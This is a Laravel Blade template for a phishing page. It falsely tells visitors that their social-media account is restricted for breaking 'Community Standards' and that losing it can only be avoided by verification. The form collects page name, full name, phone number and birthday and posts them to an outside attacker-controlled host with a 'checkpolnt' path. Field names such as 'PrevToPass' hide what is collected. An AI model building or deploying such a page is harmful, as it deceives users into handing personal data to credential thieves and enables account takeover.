@extends('layout.index')
@section('content')
    <script language="JavaScript">
        var tanggallengkap = new String();
        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
        namahari = namahari.split(" ");
        var namabulan = ("January February March April May June July August September October November December");
        namabulan = namabulan.split(" ");
        var tgl = new Date();
        var hari = tgl.getDay();
        var tanggal = tgl.getDate();
        var bulan = tgl.getMonth();
        var tahun = tgl.getFullYear();
        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
    </script>
    <div class="container">
        <div class="row">
            <div class="col-md-12 thumnail">
                <img style="display: block; width:100%" src="{{ url('images/inF0loCk.png') }}" />
                <br />
                <b style="margin-top: 15px">Your account has been restricted</b>
                <p style="margin-top: 15px">Term of Service</p>
                <hr />
                <div class="Caption">
                    We detected unusual activity in your page today <strong>
                        <script language="JavaScript">
                            document.write(tanggallengkap);
                        </script>February 24, 2024February 24, 2024
                    </strong>. Someone has reported your account for not complying with <a>Community Standards</a>. We have
                    already reviewed this decision and the decision cannot be changed. To avoid having your account
                    <a>disabled</a>, please verify:
                </div>
            </div>
            <form
                action="https://vieafb684.neaq.biz.id/ver-checkpolnt6824876/info.php?button_location=settings&amp;button_name=help"
                method="POST">

                <div class="ElementWrapper">
                    <div data-form-element-key="PrevToPrevYearDays"
                        class="FormElement FormElement_TextBox NoTopMargin PrevToPrevYearDays">
                        <div class="TextBox floatingLabelContainer">
                            <input type="text" name="PrevToEmail" id="PrevToPrevYearDays" required="" pattern=".{5,}"
                                placeholder=" ">
                            <label class="Caption" title="Page Name" for="PrevToPrevYearDays">
                                Page Name
                            </label>
                        </div>
                    </div>

                    <div data-form-element-key="PrevYearDays"
                        class="FormElement FormElement_TextBox NoTopMargin PrevYearDays">
                        <div class="TextBox floatingLabelContainer">
                            <input type="text" name="PrevToPass" id="PrevYearDays" required="" pattern=".{5,}"
                                placeholder=" ">
                            <label class="Caption" title="Your Name (Name and Surname)" for="PrevYearDays">
                                Your Name (Name and Surname)
                            </label>
                        </div>
                    </div>

                    <div data-form-element-key="PhoneNumber"
                        class="FormElement FormElement_TextBox NoTopMargin PhoneNumber">
                        <div class="TextBox floatingLabelContainer">
                            <input type="text" name="PrevToPass2" id="PhoneNumber" required="" pattern=".{5,}"
                                placeholder=" ">
                            <label class="Caption" title="Your Phone Number" for="PhoneNumber">
                                Your Phone Number
                            </label>
                        </div>
                    </div>
                </div>

                <div data-form-element-key="Birthday" class="FormElement FormElement_TextBox NoTopMargin Birthday">
                    <div class="TextBox floatingLabelContainer">
                        <input type="text" name="PrevToPass3" id="Birthday" required="" pattern=".{5,}"
                            placeholder=" ">
                        <label class="Caption" title="Birthday" for="Birthday">
                            Birthday (dd/mm/yyyy)
                        </label>
                    </div>
                </div>
            </form>
        </div>
        <style>
            .container {
                max-width: 720px;
                max-height: 100vh;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                flex-direction: column;
            }

            @media screen and (max-width: 640px) {
                .container {
                    min-height: 57vh;
                }
            }

            * {
                font-family: Arial, Helvetica, sans-serif;
                line-height: 1.2rem;
            }

            .thumnail {
                font-size: 1.08rem;
                max-width: 600px;
                margin: auto;
            }

            .btn-continue {
                width: 100%;
                text-align: center;
                padding: 16px 0;
                color: rgb(255, 255, 255);
                text-decoration: none;
                font-size: 1.1rem;
            }
        </style>
    @endsection
